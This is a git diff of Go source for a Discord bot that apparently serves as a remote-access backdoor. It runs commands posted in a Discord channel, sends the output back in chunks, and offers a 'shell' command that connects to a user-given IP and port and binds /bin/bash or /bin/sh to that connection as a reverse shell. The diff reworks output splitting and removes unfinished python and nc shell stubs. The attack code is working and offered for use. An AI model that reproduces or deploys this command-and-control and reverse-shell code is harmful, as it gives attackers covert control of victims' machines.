@@ -108,17 +108,31 @@ func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 		// PUT THIS IS A FUNCTION
 		println(message.Content)
 		if message.ChannelID == channelID.ID {
-			output := executeCommand(message.Content[22:])
-			if output == "" {
-				dg.ChannelMessageSend(message.ChannelID, "Command didn't return anything")
-			} else if len(output) > 2000 { // TODO Still doesn't output everything
-				firsthalf := output[:1900]
-				otherhalf := output[1900:]
-				dg.ChannelMessageSend(message.ChannelID, "```"+firsthalf+"```")
-				dg.ChannelMessageSend(message.ChannelID, "```"+otherhalf+"```")
-			} else {
-				dg.ChannelMessageSend(message.ChannelID, "```"+output+"```")
-			}
+			output := executeCommand(message.Content)
+				if output == "" {
+					dg.ChannelMessageSend(message.ChannelID, "Command didn't return anything")
+				} else {
+					batch := ""
+					counter := 0
+					largeOutputChunck := []string{}
+					for char := 0; char < len(output); char++ {
+						if counter < 2000  && char < len(output) - 1 {
+							batch += string(output[char])
+							counter ++
+						} else {
+							if (char == len(output) - 1){
+								batch += string(output[char])
+							}
+							largeOutputChunck = append(largeOutputChunck, batch)
+							batch = string(output[char])
+      						counter = 1
+						}
+					}
+
+					for _, chunck := range largeOutputChunck {
+						dg.ChannelMessageSend(message.ChannelID, "```" + chunck + "```")
+					}
+				}
 		}
 	}
 
@@ -136,7 +150,7 @@ func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 			} else if strings.Contains(message.Content, "shell") && !strings.Contains(message.Content, "powershell") {
 				splitCommand := strings.Fields(message.Content)
 				if len(splitCommand) == 1 {
-					dg.ChannelMessageSend(message.ChannelID, "``` shell <type> <ip> <port> \n Example: shell bash 127.0.0.1 1337, shell python 127.0.0.1 69696\n Shell type: bash, sh, python and nc```")
+					dg.ChannelMessageSend(message.ChannelID, "``` shell <type> <ip> <port> \n Example: shell bash 127.0.0.1 1337, shell sh 127.0.0.1 69696\n Shell type: bash and sh```")
 				} else if len(splitCommand) == 4 {
 					shelltype := splitCommand[1]
 					if shelltype == "bash" {
@@ -149,9 +163,7 @@ func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 						sh := exec.Command("/bin/bash")
 						sh.Stdin, sh.Stdout, sh.Stderr = conn, conn, conn
 						sh.Run()
-						// dg.ChannelMessageSend(message.ChannelID,  "```You should receive a shell at port ####```")
 						conn.Close()
-					} else if shelltype == "python" { // TODO
 
 					} else if shelltype == "sh" {
 						hhh := splitCommand[2] + ":" + splitCommand[3]
@@ -164,10 +176,8 @@ func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 						sh := exec.Command("/bin/sh")
 						sh.Stdin, sh.Stdout, sh.Stderr = conn, conn, conn
 						sh.Run()
-						// dg.ChannelMessageSend(message.ChannelID,  "```You should receive a shell at port ####```")
 						conn.Close()
-					} else if shelltype == "nc" { //TODO
-
+						
 					} else {
 						dg.ChannelMessageSend(message.ChannelID, "```Not a supported shell type```")
 					}
@@ -193,13 +203,27 @@ func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 				output := executeCommand(message.Content)
 				if output == "" {
 					dg.ChannelMessageSend(message.ChannelID, "Command didn't return anything")
-				} else if len(output) > 2000 { // TODO Still doesn't output everything
-					firsthalf := output[:1900]
-					otherhalf := output[1900:]
-					dg.ChannelMessageSend(message.ChannelID, "```"+firsthalf+"```")
-					dg.ChannelMessageSend(message.ChannelID, "```"+otherhalf+"```")
 				} else {
-					dg.ChannelMessageSend(message.ChannelID, "```"+output+"```")
+					batch := ""
+					counter := 0
+					largeOutputChunck := []string{}
+					for char := 0; char < len(output); char++ {
+						if counter < 2000  && char < len(output) - 1 {
+							batch += string(output[char])
+							counter ++
+						} else {
+							if (char == len(output) - 1){
+								batch += string(output[char])
+							}
+							largeOutputChunck = append(largeOutputChunck, batch)
+							batch = string(output[char])
+      						counter = 1
+						}
+					}
+
+					for _, chunck := range largeOutputChunck {
+						dg.ChannelMessageSend(message.ChannelID, "```" + chunck + "```")
+					}
 				}
 			}
 		}
